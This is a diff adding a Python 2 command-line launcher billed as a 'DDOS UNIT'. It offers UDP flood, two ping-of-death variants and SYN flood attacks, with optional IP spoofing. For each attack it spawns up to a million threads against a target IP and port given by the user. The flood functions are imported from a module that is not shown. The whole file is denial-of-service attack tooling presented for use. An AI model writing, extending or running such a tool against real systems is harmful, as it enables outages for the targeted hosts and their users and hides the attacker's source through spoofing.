@@ -1,0 +1,185 @@
+#!/usr/bin/python
+from Funcs import *
+import threading
+from sys import argv, exit
+
+
+  ########  Design Area  #############
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+color = [bcolors.OKBLUE, bcolors.HEADER, bcolors.BOLD, bcolors.WARNING, bcolors.OKGREEN, bcolors.FAIL, bcolors.UNDERLINE]
+
+def head():
+    pattern = ("""%s                                  ($$$$$)                            
+            ($)                   ($$$$$)                   ($)      
+           ($$)                   ($$$$$)                   ($$)     
+          ($$)                    ($$$$$)                    ($$)    
+         ($$)                     ($$$$$)                     ($$)   
+         ($$$)                    ($$$$$)                    ($$$)   
+          ($$$$)                  ($$$$$)                  ($$$$)    
+           ($$$$$)                ($$$$$)                ($$$$$)     
+            ($$$$$)               ($$$$$)               ($$$$$)      
+             ($$$$$)            ($$$$$$$$$)            ($$$$$)       
+               ($$$$$$$)      ($$$$$$$$$$$$$)      ($$$$$$$)         
+             ($$$$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$)      
+                   ($$$$$$$$$$$$$$$$   $$$$$$$$$$$$$$$$)            
+              ($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$)%s"""
+               %(
+                   color[random.randrange(0, 6)],
+                   bcolors.ENDC
+               )
+               )
+
+    print pattern
+def usage():
+    print (
+        """%s|_***************************** DDOS UNIT *********************************_|
+%s|\OPTIONS                                                                   |
+|\USE <UDPF> FOR UDP FLOOD ATTACK                                           |
+|\USE <POD>  FOR PING OF DEATH ATTACK v1                                    |
+|\USE <SSS>  FOR PING OF DEATH ATTACK v2                                    |
+|\USE <SYNF> FOR SYN FLOOD ATTACK                                           |
+|\USE <Y> OR <N> TO ENABLE OR DISABLE IP SPOOFER                            |
+%s|---------                                                                  |
+%s|\EXAMPLES:%s                                                                 |
+|\Usage:    %s <type>   <ip>   <port> <SPOOF>                             |
+|\Usage:    %s  UDPF 192.168.1.1 80                                       |
+|\Usage:    %s  POD  192.168.1.1        Y                                 |
+|\Usage:    %s  POD  192.168.1.1        N                                 |
+|\Usage:    %s  SSS  192.168.1.1                                          |
+|\Usage:    %s  SYNF 192.168.1.1 80     Y                                 |
+|\Usage:    %s  SYNF 192.168.1.1 80     N                                 |
+|_*************************************************************************_|
+            %s """
+        %(
+            color[random.randrange(0, 6)],
+            color[random.randrange(0, 6)],
+            bcolors.ENDC,
+            color[random.randrange(0, 6)],
+            color[random.randrange(0, 6)],
+            argv[0],
+            argv[0],
+            argv[0],
+            argv[0],
+	    argv[0],
+            argv[0],
+            argv[0],
+            bcolors.ENDC
+        )
+    )
+
+    sys.exit(1)
+############ MAIN ##############
+def main():
+    if len(argv) > 1 :               # if input count more than 1
+        if argv[1].upper() == "POD": # if the first input is POD
+            if len(argv) < 4:        # if the count of input less than 3
+                usage()              # print usage
+                exit(0)              # Exit
+            if IsValidIpv4Address(argv[2]):     # if the second  input is valid ip address
+                if argv[3].upper() == "Y":        # if the third input is Y
+                    InPut.TargetIp   = argv[2]    # Store the ip to target ip in class Input
+                    InPut.Spoof      = True       # Store the True to Spoof in class Input
+                    for i in range(1000000):      # loop with 1000.000 circles
+                        t = threading.Thread(target=PingOfDeath) #add Ping of death to Thread
+                        t.daemon = True
+                        t.start()                 # Start threading
+                        t.join()
+
+
+                elif argv[3].upper() == "N":        # if the third input is N
+                    InPut.TargetIp   = argv[2]      # Store the ip to target ip in class Input
+                    InPut.Spoof      = False        # Store the False to Spoof in class Input
+                    for i in range(1000000):        # loop with 1000.000 circles
+                        t = threading.Thread(target=PingOfDeath)   #add Ping of death to Thread
+                        t.daemon = True
+                        t.start()                              # Start threading
+                        t.join()
+                else:                            # if thirs input not Y and not N
+                    usage()                      # print Usage
+                    exit(0)                      # exit
+
+
+        elif argv[1].upper() == "SSS":
+            if len(argv)  < 3:
+		print "bad"
+                usage()
+                exit(0)
+            else:
+                if IsValidIpv4Address(argv[2]):
+                    InPut.TargetIp = argv[2]  # Store the ip to target ip in class Input
+                    for i in range(1000000):  # loop with 1000.000 circles
+                        t = threading.Thread(target=PingOfDeathSocket)  # add Ping of death to Thread
+                        t.daemon = True
+                        t.start()  # Start threading
+                        t.join()
+
+
+        elif argv[1].upper() == "SYNF":        # if the first input is synf
+            if len(argv) < 5 :                 # if the count of input less than 4
+                usage()                        # print usage
+                exit(0)                        # exit
+            else:                              # in count of input is 4 or more
+                if argv[4].upper() == "Y" \
+                        and IsValidIpv4Address(argv[2]) \
+                        and IsValidPort(argv[3]): # if the 4th input is Y and second input is valid ip address and the third input if valid port
+                    InPut.TargetIp   = argv[2] # Store the ip to target ip in class Input
+                    InPut.TargetPort = argv[3] # Store the port to target port in class Input
+                    InPut.Spoof      = True    # Store True to Spoof in class Input
+                    for i in range(1000000):   # loop with 1000.000 circles
+                        t = threading.Thread(target=SYNflood) # add SYN Flood to Thread
+                        t.daemon = True
+                        t.start()                              # Start thread
+                        t.join()
+
+                elif argv[4].upper() == "N" \
+                        and IsValidIpv4Address(argv[2]) \
+                        and IsValidPort(argv[3]): ## if the 4th input is Y and second input is valid ip address and the third input if valid port
+                    InPut.TargetIp   = argv[2]  # Store the ip to target ip in class Input
+                    InPut.TargetPort = argv[3]  # Store the ip to target ip in class Input
+                    InPut.Spoof      = False    # Store the ip to target ip in class Input
+                    for i in range(1000000):    # loop with 1000.000 circles
+                        t = threading.Thread(target=SYNflood)  # add SYN Flood to Thread
+                        t.daemon = True
+                        t.start()                 # Start Thread
+                        t.join()
+
+                else:                         # if the first input not SYNF
+                    usage()                   # print usage
+                    exit(0)                   # exit
+
+        elif argv[1].upper() == "UDPF":       # if the first input is UDPF
+            if len(argv) < 4:                 # if the count of input less than 3
+                usage()                       # print usage
+                exit(0)                       # Exit
+            else:                             # if the count of input is 3 or more
+                if IsValidIpv4Address(argv[2]) \
+                        and IsValidPort(argv[3]):  # if the second input is Valid ip and the third input is valid port
+                    InPut.TargetIp = argv[2]    # Store the ip to target ip in class Input
+                    InPut.TargetPort = argv[3]  # Store the ip to target ip in class Input
+                    for i in range(1000000):    # loop with 1000.000 circles
+                        t = threading.Thread(target=UDPflood) # add UDP Flood  to Thread
+                        t.daemon = True
+                        t.start()                           # Start Thread
+                        t.join()
+                else:
+                    usage()
+                    exit(0)
+        else:
+            usage()
+            exit(0)
+    else:
+        head()
+        usage()
+        exit(0)
+
+if __name__ == '__main__':
+    main()
